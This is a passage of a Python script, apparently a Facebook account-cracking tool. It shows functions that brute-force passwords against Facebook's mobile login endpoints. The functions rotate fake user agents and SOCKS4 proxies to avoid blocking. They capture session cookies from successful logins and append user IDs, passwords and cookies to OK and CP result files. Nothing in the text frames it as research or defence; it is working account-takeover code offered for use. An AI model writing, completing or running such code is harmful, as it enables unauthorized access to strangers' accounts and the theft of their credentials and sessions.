			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf}|{pw}|{tahun(idf)}\n[bold yellow]{ua}",width=70,title=f"[bold yellow] BAZ CP ",style=f"{warna_kolor}"))
				os.popen('play-audio bazcp.mp3')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(panel(f"[bold green]{idf}|{pw}|{tahun(idf)}\n[bold green]{kuki}\n[bold green]{ua}[/]",width=70,title=f"[bold green] BAZ OK ",style=f"{warna_kolor}"))
				os.popen('play-audio bazok.mp3')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
###----------[ MOBILE V3 ]---------- ###
def crackf(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugenf)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf}|{pw}|{tahun(idf)}\n[bold yellow]{ua}",width=70,title=f"[bold yellow] BAZ CP ",style=f"{warna_kolor}"))
				os.popen('play-audio bazcp.mp3')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(panel(f"[bold green]{idf}|{pw}|{tahun(idf)}\n[bold green]{kuki}\n[bold green]{ua}[/]",width=70,title=f"[bold green] BAZ OK ",style=f"{warna_kolor}"))
				os.popen('play-audio bazok.mp3')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
###----------[ SISTEM KONTROL ]---------- ###
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	basarii()
